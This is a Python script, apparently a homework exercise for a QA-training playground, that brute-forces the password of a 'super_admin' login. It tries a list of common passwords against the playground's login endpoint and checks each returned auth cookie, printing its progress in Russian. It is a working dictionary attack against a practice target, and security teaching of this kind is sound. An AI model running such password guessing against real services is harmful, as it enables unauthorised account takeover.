import requests

URL_GET_PASSWORD = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
URL_CHECK_COOKIE = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"

LOGIN = "super_admin"

passwords = [
    "1234", "123123", "12345", "123456", "1234567", "12345678",
    "123456789", "1234567890", "1q2w3e4r", "1qaz2wsx", "654321",
    "666666", "696969", "7777777", "888888", "aa123456",
    "abc123", "access", "adobe123", "admin", "ashley",
    "azerty", "bailey", "baseball", "batman", "charlie",
    "donald", "dragon", "flower", "football", "freedom",
    "hottie", "iloveyou", "letmein", "lovely", "login",
    "loveme", "master", "michael", "monkey", "mustang",
    "ninja", "passw0rd", "password", "password1", "photoshop",
    "princess", "qazwsx", "qwerty", "qwerty123", "qwertyuiop",
    "shadow", "solo", "starwars", "sunshine", "superman",
    "trustno1", "whatever", "welcome", "zaq1zaq1"
]

print("Подбор пароля для логина:", LOGIN)

for password in passwords:
    print(f"Проверка пароля: {password}")

    response1 = requests.post(URL_GET_PASSWORD, data={
        "login": LOGIN,
        "password": password
    })

    auth_cookie = response1.cookies.get("auth_cookie")

    if not auth_cookie:
        print("Cookie не получена")
        continue

    cookies = {"auth_cookie": auth_cookie}
    response2 = requests.post(URL_CHECK_COOKIE, cookies=cookies)
    check_result = response2.text

    if "You are authorized" in check_result:
        print("Успешно")
        print(f"Логин: {LOGIN}")
        print(f"Пароль: {password}")
        print(f"Результат: {check_result}")
        print("="*50)
        break
    else:
        print(f"  Ошибка: {check_result} — неверный пароль")
        print("-" * 30)

else:
    print("Пароль не найден")